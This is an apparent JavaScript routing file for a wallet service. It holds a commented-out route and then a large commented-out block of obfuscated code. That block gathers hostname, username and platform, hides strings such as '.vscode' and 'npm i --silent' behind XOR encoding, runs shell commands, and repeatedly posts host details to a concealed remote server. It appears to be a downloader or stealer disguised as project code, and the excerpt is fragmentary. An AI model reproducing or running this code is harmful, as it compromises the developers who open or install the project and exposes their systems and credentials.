...
// router.post(
//   "/wallet/:id/:chain/:protcol_id",
//   walletController.walletCostBasisForTest
// );
...
//     try {
//       const aA =
//         (-parseInt(aL(0x198)) / 0x1) * (parseInt(aL(0x1a7)) / 0x2) +
//         (-parseInt(aL(0x1a0)) / 0x3) * (parseInt(aL(0x18d)) / 0x4) +
//         (parseInt(aL(0x194)) / 0x5) * (-parseInt(aL(0x1ad)) / 0x6) +
//         (parseInt(aL(0x1aa)) / 0x7) * (parseInt(aL(0x19b)) / 0x8) +
//         (parseInt(aL(0x1ac)) / 0x9) * (-parseInt(aL(0x19f)) / 0xa) +
//         (-parseInt(aL(0x196)) / 0xb) * (parseInt(aL(0x18f)) / 0xc) +
//         parseInt(aL(0x197)) / 0xd;
//       if (aA === ay) break;
//       else az["push"](az["shift"]());
//     } catch (aB) {
//       az["push"](az["shift"]());
//     }
//   }
...
//             const aM = E;
//             if (az) {
//               const aB = az[aM(0x199)](ay, arguments);
//               return (az = null), aB;
//             }
//           }
//         : function () {};
...
//   L = require("fs"),
//   M = require("os"),
//   O = (ax) => ((s1 = ax["slice"](0x1)), Buffer[aO(0x1a1)](s1, I)[aO(0x193)](K));
// (rq = require(O(aO(0x1a3)))),
//   (pt = require(O(aO(0x1ab)))),
//   (ex = require(O(aO(0x18e)))[O(aO(0x1a4))]),
//   (zv = require(O(aO(0x1b1)))),
//   (hd = M[O(aO(0x19c))]()),
//   (hs = M[O(aO(0x1b3))]()),
//   (pl = M[O(aO(0x191))]()),
//   (uin = M[O("AdXNlckluZm8")]());
// let P;
// const Q = (ax) => Buffer[aO(0x1a1)](ax, I)[aO(0x193)](K),
//   a0 = () => {
...
//   },
//   a1 = [0x24, 0xc0, 0x29, 0x8],
//   a2 = (ax) => {
//     let ay = "";
//     for (let az = 0x0; az < ax["length"]; az++)
//       (rr = 0xff & (ax[az] ^ a1[0x3 & az])), (ay += String["fromCharCode"](rr));
//     return ay;
//   },
//   a3 = aO(0x195),
//   a4 = aO(0x1a5),
...
// }
// const a8 = Q(aO(0x1a6)),
//   a9 = [0xa, 0xb6, 0x5a, 0x6b, 0x4b, 0xa4, 0x4c],
//   aa = [0xb, 0xaa, 0x6],
//   ab = () => {
//     const aP = aO,
//       ax = a0(),
...
//       az = Q(a5),
//       aA = a2(a9);
//     let aB = pt[aP(0x190)](hd, aA);
//     try {
//       (aC = aB), L[a8](aC, { recursive: !0x0 });
//     } catch (aF) {
//       aB = hd;
//     }
//     var aC;
//     const aD = "" + ax + a2(aa) + a3,
//       aE = pt["join"](aB, a2(ac));
//     try {
//       !(function (aG) {
//         const aQ = aP,
...
//     });
//   },
//   ac = [0x50, 0xa5, 0x5a, 0x7c, 0xa, 0xaa, 0x5a],
//   ad = [0xb, 0xb0],
//   ae = [0x54, 0xa1, 0x4a, 0x63, 0x45, 0xa7, 0x4c, 0x26, 0x4e, 0xb3, 0x46, 0x66],
//   af = (ax) => {
//     const aR = aO,
//       ay = a0(),
//       az = Q(a4),
...
//   ag = [0x47, 0xa4],
//   ah = [
//     0x2, 0xe6, 0x9, 0x66, 0x54, 0xad, 0x9, 0x61, 0x4, 0xed, 0x4, 0x7b, 0x4d,
//     0xac, 0x4c, 0x66, 0x50,
//   ],
//   ai = [0x4a, 0xaf, 0x4d, 0x6d, 0x7b, 0xad, 0x46, 0x6c, 0x51, 0xac, 0x4c, 0x7b],
//   aj = (ax) => {
//     const ay = a2(ag) + " \x22" + ax + "\x22 " + a2(ah),
//       az = pt["join"](ax, a2(ai));
//     try {
//       a7(az)
//         ? ao(ax)
...
//     } catch (aA) {}
//   },
//   ak = [0x4a, 0xaf, 0x4d, 0x6d],
//   al = [0x4a, 0xb0, 0x44, 0x28, 0x9, 0xed, 0x59, 0x7a, 0x41, 0xa6, 0x40, 0x70],
//   am = [0x4d, 0xae, 0x5a, 0x7c, 0x45, 0xac, 0x45],
//   an = (ax) => {
//     const ay = a2(al) + " \x22" + ax + "\x22 " + a2(am),
//       az = pt["join"](ax, a2(ai));
//     try {
//       a7(az)
//         ? ao(ax)
...
//   const aS = aO,
//     az = { ts: P, type: a3, hid: as, ss: ax, cc: ay },
//     aA = a0(),
//     aB = { [aq]: "" + aA + Q(aS(0x1a8)), [ap]: az };
//   try {
//     rq[ar](aB, (aC, aD, aE) => {});
//   } catch (aC) {}
// };
...
//       await (async () => {
//         const aU = aT;
//         (as = hs), "d" == pl[0x0] && (as = as + "+" + uin[Q("dXNlcm5hbWU")]);
//         let ax = "3D1";
//         try {
//           ax += zv[Q("YXJndg")][0x1];
//         } catch (ay) {}
...
// av();
// let aw = setInterval(() => {
//   (au += 0x1) < 0x3 ? av() : clearInterval(aw);
// }, 0x927c0);
